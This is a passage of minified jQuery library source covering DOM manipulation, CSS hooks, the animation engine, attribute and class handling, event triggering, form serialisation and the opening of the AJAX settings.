0,"input"===(l=u.nodeName.toLowerCase())&&pe.test(s.type)?u.checked=s.checked:"input"!==l&&"textarea"!==l||(u.defaultValue=s.defaultValue);if(t)if(n)for(o=o||ve(e),a=a||ve(c),r=0,i=o.length;r<i;r++)Oe(o[r],a[r]);else Oe(e,c);return 0<(a=ve(c,"script")).length&&ye(a,!f&&ve(e,"script")),c},cleanData:function(e){for(var t,n,r,i=S.event.special,o=0;void 0!==(n=e[o]);o++)if(V(n)){if(t=n[Y.expando]){if(t.events)for(r in t.events)i[r]?S.event.remove(n,r):S.removeEvent(n,r,t.handle);n[Y.expando]=void 0}n[Q.expando]&&(n[Q.expando]=void 0)}}}),S.fn.extend({detach:function(e){return Re(this,e,!0)},remove:function(e){return Re(this,e)},text:function(e){return $(this,function(e){return void 0===e?S.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return Pe(this,arguments,function(e){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||qe(this,e).appendChild(e)})},prepend:function(){return Pe(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=qe(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return Pe(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return Pe(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(S.cleanData(ve(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return S.clone(this,e,t)})},html:function(e){return $(this,function(e){var t=this[0]||{},n=0,r=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!Ne.test(e)&&!ge[(de.exec(e)||["",""])[1].toLowerCase()]){e=S.htmlPrefilter(e);try{for(;n<r;n++)1===(t=this[n]||{}).nodeType&&(S.cleanData(ve(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var n=[];return Pe(this,arguments,function(e){var t=this.parentNode;S.inArray(this,n)<0&&(S.cleanData(ve(this)),t&&t.replaceChild(e,this))},n)}}),S.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,a){S.fn[e]=function(e){for(var t,n=[],r=S(e),i=r.length-1,o=0;o<=i;o++)t=o===i?this:this.clone(!0),S(r[o])[a](t),u.apply(n,t.get());return this.pushStack(n)}});var Me=new RegExp("^("+ee+")(?!px)[a-z%]+$","i"),Ie=function(e){var t=e.ownerDocument.defaultView;return t&&t.opener||(t=C),t.getComputedStyle(e)},We=function(e,t,n){var r,i,o={};for(i in t)o[i]=e.style[i],e.style[i]=t[i];for(i in r=n.call(e),t)e.style[i]=o[i];return r},Fe=new RegExp(ne.join("|"),"i");function Be(e,t,n){var r,i,o,a,s=e.style;return(n=n||Ie(e))&&(""!==(a=n.getPropertyValue(t)||n[t])||ie(e)||(a=S.style(e,t)),!y.pixelBoxStyles()&&Me.test(a)&&Fe.test(t)&&(r=s.width,i=s.minWidth,o=s.maxWidth,s.minWidth=s.maxWidth=s.width=a,a=n.width,s.width=r,s.minWidth=i,s.maxWidth=o)),void 0!==a?a+"":a}function $e(e,t){return{get:function(){if(!e())return(this.get=t).apply(this,arguments);delete this.get}}}!function(){function e(){if(l){u.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",l.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",re.appendChild(u).appendChild(l);var e=C.getComputedStyle(l);n="1%"!==e.top,s=12===t(e.marginLeft),l.style.right="60%",o=36===t(e.right),r=36===t(e.width),l.style.position="absolute",i=12===t(l.offsetWidth/3),re.removeChild(u),l=null}}function t(e){return Math.round(parseFloat(e))}var n,r,i,o,a,s,u=E.createElement("div"),l=E.createElement("div");l.style&&(l.style.backgroundClip="content-box",l.cloneNode(!0).style.backgroundClip="",y.clearCloneStyle="content-box"===l.style.backgroundClip,S.extend(y,{boxSizingReliable:function(){return e(),r},pixelBoxStyles:function(){return e(),o},pixelPosition:function(){return e(),n},reliableMarginLeft:function(){return e(),s},scrollboxSize:function(){return e(),i},reliableTrDimensions:function(){var e,t,n,r;return null==a&&(e=E.createElement("table"),t=E.createElement("tr"),n=E.createElement("div"),e.style.cssText="position:absolute;left:-11111px",t.style.height="1px",n.style.height="9px",re.appendChild(e).appendChild(t).appendChild(n),r=C.getComputedStyle(t),a=3<parseInt(r.height),re.removeChild(e)),a}}))}();var _e=["Webkit","Moz","ms"],ze=E.createElement("div").style,Ue={};function Xe(e){var t=S.cssProps[e]||Ue[e];return t||(e in ze?e:Ue[e]=function(e){var t=e[0].toUpperCase()+e.slice(1),n=_e.length;while(n--)if((e=_e[n]+t)in ze)return e}(e)||e)}var Ve=/^(none|table(?!-c[ea]).+)/,Ge=/^--/,Ye={position:"absolute",visibility:"hidden",display:"block"},Qe={letterSpacing:"0",fontWeight:"400"};function Je(e,t,n){var r=te.exec(t);return r?Math.max(0,r[2]-(n||0))+(r[3]||"px"):t}function Ke(e,t,n,r,i,o){var a="width"===t?1:0,s=0,u=0;if(n===(r?"border":"content"))return 0;for(;a<4;a+=2)"margin"===n&&(u+=S.css(e,n+ne[a],!0,i)),r?("content"===n&&(u-=S.css(e,"padding"+ne[a],!0,i)),"margin"!==n&&(u-=S.css(e,"border"+ne[a]+"Width",!0,i))):(u+=S.css(e,"padding"+ne[a],!0,i),"padding"!==n?u+=S.css(e,"border"+ne[a]+"Width",!0,i):s+=S.css(e,"border"+ne[a]+"Width",!0,i));return!r&&0<=o&&(u+=Math.max(0,Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-o-u-s-.5))||0),u}function Ze(e,t,n){var r=Ie(e),i=(!y.boxSizingReliable()||n)&&"border-box"===S.css(e,"boxSizing",!1,r),o=i,a=Be(e,t,r),s="offset"+t[0].toUpperCase()+t.slice(1);if(Me.test(a)){if(!n)return a;a="auto"}return(!y.boxSizingReliable()&&i||!y.reliableTrDimensions()&&A(e,"tr")||"auto"===a||!parseFloat(a)&&"inline"===S.css(e,"display",!1,r))&&e.getClientRects().length&&(i="border-box"===S.css(e,"boxSizing",!1,r),(o=s in e)&&(a=e[s])),(a=parseFloat(a)||0)+Ke(e,t,n||(i?"border":"content"),o,r,a)+"px"}function et(e,t,n,r,i){return new et.prototype.init(e,t,n,r,i)}S.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=Be(e,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,gridArea:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnStart:!0,gridRow:!0,gridRowEnd:!0,gridRowStart:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{},style:function(e,t,n,r){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var i,o,a,s=X(t),u=Ge.test(t),l=e.style;if(u||(t=Xe(s)),a=S.cssHooks[t]||S.cssHooks[s],void 0===n)return a&&"get"in a&&void 0!==(i=a.get(e,!1,r))?i:l[t];"string"===(o=typeof n)&&(i=te.exec(n))&&i[1]&&(n=se(e,t,i),o="number"),null!=n&&n==n&&("number"!==o||u||(n+=i&&i[3]||(S.cssNumber[s]?"":"px")),y.clearCloneStyle||""!==n||0!==t.indexOf("background")||(l[t]="inherit"),a&&"set"in a&&void 0===(n=a.set(e,n,r))||(u?l.setProperty(t,n):l[t]=n))}},css:function(e,t,n,r){var i,o,a,s=X(t);return Ge.test(t)||(t=Xe(s)),(a=S.cssHooks[t]||S.cssHooks[s])&&"get"in a&&(i=a.get(e,!0,n)),void 0===i&&(i=Be(e,t,r)),"normal"===i&&t in Qe&&(i=Qe[t]),""===n||n?(o=parseFloat(i),!0===n||isFinite(o)?o||0:i):i}}),S.each(["height","width"],function(e,u){S.cssHooks[u]={get:function(e,t,n){if(t)return!Ve.test(S.css(e,"display"))||e.getClientRects().length&&e.getBoundingClientRect().width?Ze(e,u,n):We(e,Ye,function(){return Ze(e,u,n)})},set:function(e,t,n){var r,i=Ie(e),o=!y.scrollboxSize()&&"absolute"===i.position,a=(o||n)&&"border-box"===S.css(e,"boxSizing",!1,i),s=n?Ke(e,u,n,a,i):0;return a&&o&&(s-=Math.ceil(e["offset"+u[0].toUpperCase()+u.slice(1)]-parseFloat(i[u])-Ke(e,u,"border",!1,i)-.5)),s&&(r=te.exec(t))&&"px"!==(r[3]||"px")&&(e.style[u]=t,t=S.css(e,u)),Je(0,t,s)}}}),S.cssHooks.marginLeft=$e(y.reliableMarginLeft,function(e,t){if(t)return(parseFloat(Be(e,"marginLeft"))||e.getBoundingClientRect().left-We(e,{marginLeft:0},function(){return e.getBoundingClientRect().left}))+"px"}),S.each({margin:"",padding:"",border:"Width"},function(i,o){S.cssHooks[i+o]={expand:function(e){for(var t=0,n={},r="string"==typeof e?e.split(" "):[e];t<4;t++)n[i+ne[t]+o]=r[t]||r[t-2]||r[0];return n}},"margin"!==i&&(S.cssHooks[i+o].set=Je)}),S.fn.extend({css:function(e,t){return $(this,function(e,t,n){var r,i,o={},a=0;if(Array.isArray(t)){for(r=Ie(e),i=t.length;a<i;a++)o[t[a]]=S.css(e,t[a],!1,r);return o}return void 0!==n?S.style(e,t,n):S.css(e,t)},e,t,1<arguments.length)}}),((S.Tween=et).prototype={constructor:et,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||S.easing._default,this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(S.cssNumber[n]?"":"px")},cur:function(){var e=et.propHooks[this.prop];return e&&e.get?e.get(this):et.propHooks._default.get(this)},run:function(e){var t,n=et.propHooks[this.prop];return this.options.duration?this.pos=t=S.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):et.propHooks._default.set(this),this}}).init.prototype=et.prototype,(et.propHooks={_default:{get:function(e){var t;return 1!==e.elem.nodeType||null!=e.elem[e.prop]&&null==e.elem.style[e.prop]?e.elem[e.prop]:(t=S.css(e.elem,e.prop,""))&&"auto"!==t?t:0},set:function(e){S.fx.step[e.prop]?S.fx.step[e.prop](e):1!==e.elem.nodeType||!S.cssHooks[e.prop]&&null==e.elem.style[Xe(e.prop)]?e.elem[e.prop]=e.now:S.style(e.elem,e.prop,e.now+e.unit)}}}).scrollTop=et.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},S.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2},_default:"swing"},S.fx=et.prototype.init,S.fx.step={};var tt,nt,rt,it,ot=/^(?:toggle|show|hide)$/,at=/queueHooks$/;function st(){nt&&(!1===E.hidden&&C.requestAnimationFrame?C.requestAnimationFrame(st):C.setTimeout(st,S.fx.interval),S.fx.tick())}function ut(){return C.setTimeout(function(){tt=void 0}),tt=Date.now()}function lt(e,t){var n,r=0,i={height:e};for(t=t?1:0;r<4;r+=2-t)i["margin"+(n=ne[r])]=i["padding"+n]=e;return t&&(i.opacity=i.width=e),i}function ct(e,t,n){for(var r,i=(ft.tweeners[t]||[]).concat(ft.tweeners["*"]),o=0,a=i.length;o<a;o++)if(r=i[o].call(n,t,e))return r}function ft(o,e,t){var n,a,r=0,i=ft.prefilters.length,s=S.Deferred().always(function(){delete u.elem}),u=function(){if(a)return!1;for(var e=tt||ut(),t=Math.max(0,l.startTime+l.duration-e),n=1-(t/l.duration||0),r=0,i=l.tweens.length;r<i;r++)l.tweens[r].run(n);return s.notifyWith(o,[l,n,t]),n<1&&i?t:(i||s.notifyWith(o,[l,1,0]),s.resolveWith(o,[l]),!1)},l=s.promise({elem:o,props:S.extend({},e),opts:S.extend(!0,{specialEasing:{},easing:S.easing._default},t),originalProperties:e,originalOptions:t,startTime:tt||ut(),duration:t.duration,tweens:[],createTween:function(e,t){var n=S.Tween(o,l.opts,e,t,l.opts.specialEasing[e]||l.opts.easing);return l.tweens.push(n),n},stop:function(e){var t=0,n=e?l.tweens.length:0;if(a)return this;for(a=!0;t<n;t++)l.tweens[t].run(1);return e?(s.notifyWith(o,[l,1,0]),s.resolveWith(o,[l,e])):s.rejectWith(o,[l,e]),this}}),c=l.props;for(!function(e,t){var n,r,i,o,a;for(n in e)if(i=t[r=X(n)],o=e[n],Array.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),(a=S.cssHooks[r])&&"expand"in a)for(n in o=a.expand(o),delete e[r],o)n in e||(e[n]=o[n],t[n]=i);else t[r]=i}(c,l.opts.specialEasing);r<i;r++)if(n=ft.prefilters[r].call(l,o,c,l.opts))return m(n.stop)&&(S._queueHooks(l.elem,l.opts.queue).stop=n.stop.bind(n)),n;return S.map(c,ct,l),m(l.opts.start)&&l.opts.start.call(o,l),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always),S.fx.timer(S.extend(u,{elem:o,anim:l,queue:l.opts.queue})),l}S.Animation=S.extend(ft,{tweeners:{"*":[function(e,t){var n=this.createTween(e,t);return se(n.elem,e,te.exec(t),n),n}]},tweener:function(e,t){m(e)?(t=e,e=["*"]):e=e.match(P);for(var n,r=0,i=e.length;r<i;r++)n=e[r],ft.tweeners[n]=ft.tweeners[n]||[],ft.tweeners[n].unshift(t)},prefilters:[function(e,t,n){var r,i,o,a,s,u,l,c,f="width"in t||"height"in t,p=this,d={},h=e.style,g=e.nodeType&&ae(e),v=Y.get(e,"fxshow");for(r in n.queue||(null==(a=S._queueHooks(e,"fx")).unqueued&&(a.unqueued=0,s=a.empty.fire,a.empty.fire=function(){a.unqueued||s()}),a.unqueued++,p.always(function(){p.always(function(){a.unqueued--,S.queue(e,"fx").length||a.empty.fire()})})),t)if(i=t[r],ot.test(i)){if(delete t[r],o=o||"toggle"===i,i===(g?"hide":"show")){if("show"!==i||!v||void 0===v[r])continue;g=!0}d[r]=v&&v[r]||S.style(e,r)}if((u=!S.isEmptyObject(t))||!S.isEmptyObject(d))for(r in f&&1===e.nodeType&&(n.overflow=[h.overflow,h.overflowX,h.overflowY],null==(l=v&&v.display)&&(l=Y.get(e,"display")),"none"===(c=S.css(e,"display"))&&(l?c=l:(le([e],!0),l=e.style.display||l,c=S.css(e,"display"),le([e]))),("inline"===c||"inline-block"===c&&null!=l)&&"none"===S.css(e,"float")&&(u||(p.done(function(){h.display=l}),null==l&&(c=h.display,l="none"===c?"":c)),h.display="inline-block")),n.overflow&&(h.overflow="hidden",p.always(function(){h.overflow=n.overflow[0],h.overflowX=n.overflow[1],h.overflowY=n.overflow[2]})),u=!1,d)u||(v?"hidden"in v&&(g=v.hidden):v=Y.access(e,"fxshow",{display:l}),o&&(v.hidden=!g),g&&le([e],!0),p.done(function(){for(r in g||le([e]),Y.remove(e,"fxshow"),d)S.style(e,r,d[r])})),u=ct(g?v[r]:0,r,p),r in v||(v[r]=u.start,g&&(u.end=u.start,u.start=0))}],prefilter:function(e,t){t?ft.prefilters.unshift(e):ft.prefilters.push(e)}}),S.speed=function(e,t,n){var r=e&&"object"==typeof e?S.extend({},e):{complete:n||!n&&t||m(e)&&e,duration:e,easing:n&&t||t&&!m(t)&&t};return S.fx.off?r.duration=0:"number"!=typeof r.duration&&(r.duration in S.fx.speeds?r.duration=S.fx.speeds[r.duration]:r.duration=S.fx.speeds._default),null!=r.queue&&!0!==r.queue||(r.queue="fx"),r.old=r.complete,r.complete=function(){m(r.old)&&r.old.call(this),r.queue&&S.dequeue(this,r.queue)},r},S.fn.extend({fadeTo:function(e,t,n,r){return this.filter(ae).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(t,e,n,r){var i=S.isEmptyObject(t),o=S.speed(e,n,r),a=function(){var e=ft(this,S.extend({},t),o);(i||Y.get(this,"finish"))&&e.stop(!0)};return a.finish=a,i||!1===o.queue?this.each(a):this.queue(o.queue,a)},stop:function(i,e,o){var a=function(e){var t=e.stop;delete e.stop,t(o)};return"string"!=typeof i&&(o=e,e=i,i=void 0),e&&this.queue(i||"fx",[]),this.each(function(){var e=!0,t=null!=i&&i+"queueHooks",n=S.timers,r=Y.get(this);if(t)r[t]&&r[t].stop&&a(r[t]);else for(t in r)r[t]&&r[t].stop&&at.test(t)&&a(r[t]);for(t=n.length;t--;)n[t].elem!==this||null!=i&&n[t].queue!==i||(n[t].anim.stop(o),e=!1,n.splice(t,1));!e&&o||S.dequeue(this,i)})},finish:function(a){return!1!==a&&(a=a||"fx"),this.each(function(){var e,t=Y.get(this),n=t[a+"queue"],r=t[a+"queueHooks"],i=S.timers,o=n?n.length:0;for(t.finish=!0,S.queue(this,a,[]),r&&r.stop&&r.stop.call(this,!0),e=i.length;e--;)i[e].elem===this&&i[e].queue===a&&(i[e].anim.stop(!0),i.splice(e,1));for(e=0;e<o;e++)n[e]&&n[e].finish&&n[e].finish.call(this);delete t.finish})}}),S.each(["toggle","show","hide"],function(e,r){var i=S.fn[r];S.fn[r]=function(e,t,n){return null==e||"boolean"==typeof e?i.apply(this,arguments):this.animate(lt(r,!0),e,t,n)}}),S.each({slideDown:lt("show"),slideUp:lt("hide"),slideToggle:lt("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,r){S.fn[e]=function(e,t,n){return this.animate(r,e,t,n)}}),S.timers=[],S.fx.tick=function(){var e,t=0,n=S.timers;for(tt=Date.now();t<n.length;t++)(e=n[t])()||n[t]!==e||n.splice(t--,1);n.length||S.fx.stop(),tt=void 0},S.fx.timer=function(e){S.timers.push(e),S.fx.start()},S.fx.interval=13,S.fx.start=function(){nt||(nt=!0,st())},S.fx.stop=function(){nt=null},S.fx.speeds={slow:600,fast:200,_default:400},S.fn.delay=function(r,e){return r=S.fx&&S.fx.speeds[r]||r,e=e||"fx",this.queue(e,function(e,t){var n=C.setTimeout(e,r);t.stop=function(){C.clearTimeout(n)}})},rt=E.createElement("input"),it=E.createElement("select").appendChild(E.createElement("option")),rt.type="checkbox",y.checkOn=""!==rt.value,y.optSelected=it.selected,(rt=E.createElement("input")).value="t",rt.type="radio",y.radioValue="t"===rt.value;var pt,dt=S.expr.attrHandle;S.fn.extend({attr:function(e,t){return $(this,S.attr,e,t,1<arguments.length)},removeAttr:function(e){return this.each(function(){S.removeAttr(this,e)})}}),S.extend({attr:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return"undefined"==typeof e.getAttribute?S.prop(e,t,n):(1===o&&S.isXMLDoc(e)||(i=S.attrHooks[t.toLowerCase()]||(S.expr.match.bool.test(t)?pt:void 0)),void 0!==n?null===n?void S.removeAttr(e,t):i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:(e.setAttribute(t,n+""),n):i&&"get"in i&&null!==(r=i.get(e,t))?r:null==(r=S.find.attr(e,t))?void 0:r)},attrHooks:{type:{set:function(e,t){if(!y.radioValue&&"radio"===t&&A(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},removeAttr:function(e,t){var n,r=0,i=t&&t.match(P);if(i&&1===e.nodeType)while(n=i[r++])e.removeAttribute(n)}}),pt={set:function(e,t,n){return!1===t?S.removeAttr(e,n):e.setAttribute(n,n),n}},S.each(S.expr.match.bool.source.match(/\w+/g),function(e,t){var a=dt[t]||S.find.attr;dt[t]=function(e,t,n){var r,i,o=t.toLowerCase();return n||(i=dt[o],dt[o]=r,r=null!=a(e,t,n)?o:null,dt[o]=i),r}});var ht=/^(?:input|select|textarea|button)$/i,gt=/^(?:a|area)$/i;function vt(e){return(e.match(P)||[]).join(" ")}function yt(e){return e.getAttribute&&e.getAttribute("class")||""}function mt(e){return Array.isArray(e)?e:"string"==typeof e&&e.match(P)||[]}S.fn.extend({prop:function(e,t){return $(this,S.prop,e,t,1<arguments.length)},removeProp:function(e){return this.each(function(){delete this[S.propFix[e]||e]})}}),S.extend({prop:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return 1===o&&S.isXMLDoc(e)||(t=S.propFix[t]||t,i=S.propHooks[t]),void 0!==n?i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:e[t]=n:i&&"get"in i&&null!==(r=i.get(e,t))?r:e[t]},propHooks:{tabIndex:{get:function(e){var t=S.find.attr(e,"tabindex");return t?parseInt(t,10):ht.test(e.nodeName)||gt.test(e.nodeName)&&e.href?0:-1}}},propFix:{"for":"htmlFor","class":"className"}}),y.optSelected||(S.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null},set:function(e){var t=e.parentNode;t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex)}}),S.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){S.propFix[this.toLowerCase()]=this}),S.fn.extend({addClass:function(t){var e,n,r,i,o,a,s,u=0;if(m(t))return this.each(function(e){S(this).addClass(t.call(this,e,yt(this)))});if((e=mt(t)).length)while(n=this[u++])if(i=yt(n),r=1===n.nodeType&&" "+vt(i)+" "){a=0;while(o=e[a++])r.indexOf(" "+o+" ")<0&&(r+=o+" ");i!==(s=vt(r))&&n.setAttribute("class",s)}return this},removeClass:function(t){var e,n,r,i,o,a,s,u=0;if(m(t))return this.each(function(e){S(this).removeClass(t.call(this,e,yt(this)))});if(!arguments.length)return this.attr("class","");if((e=mt(t)).length)while(n=this[u++])if(i=yt(n),r=1===n.nodeType&&" "+vt(i)+" "){a=0;while(o=e[a++])while(-1<r.indexOf(" "+o+" "))r=r.replace(" "+o+" "," ");i!==(s=vt(r))&&n.setAttribute("class",s)}return this},toggleClass:function(i,t){var o=typeof i,a="string"===o||Array.isArray(i);return"boolean"==typeof t&&a?t?this.addClass(i):this.removeClass(i):m(i)?this.each(function(e){S(this).toggleClass(i.call(this,e,yt(this),t),t)}):this.each(function(){var e,t,n,r;if(a){t=0,n=S(this),r=mt(i);while(e=r[t++])n.hasClass(e)?n.removeClass(e):n.addClass(e)}else void 0!==i&&"boolean"!==o||((e=yt(this))&&Y.set(this,"__className__",e),this.setAttribute&&this.setAttribute("class",e||!1===i?"":Y.get(this,"__className__")||""))})},hasClass:function(e){var t,n,r=0;t=" "+e+" ";while(n=this[r++])if(1===n.nodeType&&-1<(" "+vt(yt(n))+" ").indexOf(t))return!0;return!1}});var xt=/\r/g;S.fn.extend({val:function(n){var r,e,i,t=this[0];return arguments.length?(i=m(n),this.each(function(e){var t;1===this.nodeType&&(null==(t=i?n.call(this,e,S(this).val()):n)?t="":"number"==typeof t?t+="":Array.isArray(t)&&(t=S.map(t,function(e){return null==e?"":e+""})),(r=S.valHooks[this.type]||S.valHooks[this.nodeName.toLowerCase()])&&"set"in r&&void 0!==r.set(this,t,"value")||(this.value=t))})):t?(r=S.valHooks[t.type]||S.valHooks[t.nodeName.toLowerCase()])&&"get"in r&&void 0!==(e=r.get(t,"value"))?e:"string"==typeof(e=t.value)?e.replace(xt,""):null==e?"":e:void 0}}),S.extend({valHooks:{option:{get:function(e){var t=S.find.attr(e,"value");return null!=t?t:vt(S.text(e))}},select:{get:function(e){var t,n,r,i=e.options,o=e.selectedIndex,a="select-one"===e.type,s=a?null:[],u=a?o+1:i.length;for(r=o<0?u:a?o:0;r<u;r++)if(((n=i[r]).selected||r===o)&&!n.disabled&&(!n.parentNode.disabled||!A(n.parentNode,"optgroup"))){if(t=S(n).val(),a)return t;s.push(t)}return s},set:function(e,t){var n,r,i=e.options,o=S.makeArray(t),a=i.length;while(a--)((r=i[a]).selected=-1<S.inArray(S.valHooks.option.get(r),o))&&(n=!0);return n||(e.selectedIndex=-1),o}}}}),S.each(["radio","checkbox"],function(){S.valHooks[this]={set:function(e,t){if(Array.isArray(t))return e.checked=-1<S.inArray(S(e).val(),t)}},y.checkOn||(S.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})}),y.focusin="onfocusin"in C;var bt=/^(?:focusinfocus|focusoutblur)$/,wt=function(e){e.stopPropagation()};S.extend(S.event,{trigger:function(e,t,n,r){var i,o,a,s,u,l,c,f,p=[n||E],d=v.call(e,"type")?e.type:e,h=v.call(e,"namespace")?e.namespace.split("."):[];if(o=f=a=n=n||E,3!==n.nodeType&&8!==n.nodeType&&!bt.test(d+S.event.triggered)&&(-1<d.indexOf(".")&&(d=(h=d.split(".")).shift(),h.sort()),u=d.indexOf(":")<0&&"on"+d,(e=e[S.expando]?e:new S.Event(d,"object"==typeof e&&e)).isTrigger=r?2:3,e.namespace=h.join("."),e.rnamespace=e.namespace?new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,e.result=void 0,e.target||(e.target=n),t=null==t?[e]:S.makeArray(t,[e]),c=S.event.special[d]||{},r||!c.trigger||!1!==c.trigger.apply(n,t))){if(!r&&!c.noBubble&&!x(n)){for(s=c.delegateType||d,bt.test(s+d)||(o=o.parentNode);o;o=o.parentNode)p.push(o),a=o;a===(n.ownerDocument||E)&&p.push(a.defaultView||a.parentWindow||C)}i=0;while((o=p[i++])&&!e.isPropagationStopped())f=o,e.type=1<i?s:c.bindType||d,(l=(Y.get(o,"events")||Object.create(null))[e.type]&&Y.get(o,"handle"))&&l.apply(o,t),(l=u&&o[u])&&l.apply&&V(o)&&(e.result=l.apply(o,t),!1===e.result&&e.preventDefault());return e.type=d,r||e.isDefaultPrevented()||c._default&&!1!==c._default.apply(p.pop(),t)||!V(n)||u&&m(n[d])&&!x(n)&&((a=n[u])&&(n[u]=null),S.event.triggered=d,e.isPropagationStopped()&&f.addEventListener(d,wt),n[d](),e.isPropagationStopped()&&f.removeEventListener(d,wt),S.event.triggered=void 0,a&&(n[u]=a)),e.result}},simulate:function(e,t,n){var r=S.extend(new S.Event,n,{type:e,isSimulated:!0});S.event.trigger(r,null,t)}}),S.fn.extend({trigger:function(e,t){return this.each(function(){S.event.trigger(e,t,this)})},triggerHandler:function(e,t){var n=this[0];if(n)return S.event.trigger(e,t,n,!0)}}),y.focusin||S.each({focus:"focusin",blur:"focusout"},function(n,r){var i=function(e){S.event.simulate(r,e.target,S.event.fix(e))};S.event.special[r]={setup:function(){var e=this.ownerDocument||this.document||this,t=Y.access(e,r);t||e.addEventListener(n,i,!0),Y.access(e,r,(t||0)+1)},teardown:function(){var e=this.ownerDocument||this.document||this,t=Y.access(e,r)-1;t?Y.access(e,r,t):(e.removeEventListener(n,i,!0),Y.remove(e,r))}}});var Tt=C.location,Ct={guid:Date.now()},Et=/\?/;S.parseXML=function(e){var t;if(!e||"string"!=typeof e)return null;try{t=(new C.DOMParser).parseFromString(e,"text/xml")}catch(e){t=void 0}return t&&!t.getElementsByTagName("parsererror").length||S.error("Invalid XML: "+e),t};var St=/\[\]$/,kt=/\r?\n/g,At=/^(?:submit|button|image|reset|file)$/i,Nt=/^(?:input|select|textarea|keygen)/i;function Dt(n,e,r,i){var t;if(Array.isArray(e))S.each(e,function(e,t){r||St.test(n)?i(n,t):Dt(n+"["+("object"==typeof t&&null!=t?e:"")+"]",t,r,i)});else if(r||"object"!==w(e))i(n,e);else for(t in e)Dt(n+"["+t+"]",e[t],r,i)}S.param=function(e,t){var n,r=[],i=function(e,t){var n=m(t)?t():t;r[r.length]=encodeURIComponent(e)+"="+encodeURIComponent(null==n?"":n)};if(null==e)return"";if(Array.isArray(e)||e.jquery&&!S.isPlainObject(e))S.each(e,function(){i(this.name,this.value)});else for(n in e)Dt(n,e[n],t,i);return r.join("&")},S.fn.extend({serialize:function(){return S.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=S.prop(this,"elements");return e?S.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!S(this).is(":disabled")&&Nt.test(this.nodeName)&&!At.test(e)&&(this.checked||!pe.test(e))}).map(function(e,t){var n=S(this).val();return null==n?null:Array.isArray(n)?S.map(n,function(e){return{name:t.name,value:e.replace(kt,"\r\n")}}):{name:t.name,value:n.replace(kt,"\r\n")}}).get()}});var jt=/%20/g,qt=/#.*$/,Lt=/([?&])_=[^&]*/,Ht=/^(.*?):[ \t]*([^\r\n]*)$/gm,Ot=/^(?:GET|HEAD)$/,Pt=/^\/\//,Rt={},Mt={},It="*/".concat("*"),Wt=E.createElement("a");function Ft(o){return function(e,t){"string"!=typeof e&&(t=e,e="*");var n,r=0,i=e.toLowerCase().match(P)||[];if(m(t))while(n=i[r++])"+"===n[0]?(n=n.slice(1)||"*",(o[n]=o[n]||[]).unshift(t)):(o[n]=o[n]||[]).push(t)}}function Bt(t,i,o,a){var s={},u=t===Mt;function l(e){var r;return s[e]=!0,S.each(t[e]||[],function(e,t){var n=t(i,o,a);return"string"!=typeof n||u||s[n]?u?!(r=n):void 0:(i.dataTypes.unshift(n),l(n),!1)}),r}return l(i.dataTypes[0])||!s["*"]&&l("*")}function $t(e,t){var n,r,i=S.ajaxSettings.flatOptions||{};for(n in t)void 0!==t[n]&&((i[n]?e:r||(r={}))[n]=t[n]);return r&&S.extend(!0,e,r),e}Wt.href=Tt.href,S.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Tt.href,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Tt.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; 